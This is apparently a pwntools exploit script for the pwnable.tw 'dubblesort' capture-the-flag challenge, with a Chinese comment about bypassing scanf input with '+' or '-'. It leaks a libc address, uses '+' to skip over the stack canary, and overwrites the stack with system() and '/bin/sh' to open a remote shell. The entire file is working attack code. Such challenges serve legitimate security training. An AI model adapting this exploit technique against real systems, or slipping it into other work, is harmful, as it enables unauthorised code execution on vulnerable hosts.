#利用‘+’、‘-’绕过scanf输入
from pwn import *

context.log_level="debug"
#p = process("./dubblesort")

libc = ELF("./libc_32.so.6")
p = remote("chall.pwnable.tw",10101)
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))

p.sendafter("What your name :", 'a'*28)
p.recvuntil("a"*28)
libc_base = u32(p.recv(4)) - 0x1ae244
log.info("libc_base == >" + hex(libc_base))
p.sendlineafter("sort :", '35')
for i in range(24):
	p.sendlineafter("number : ", '0')
p.sendlineafter("number : ", '+')	#canary
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search("/bin/sh").next()
for i in range(9):
	p.sendlineafter("number : ", str(system))

p.sendlineafter("number : ", str(binsh))
#debug(0xb17)

p.interactive()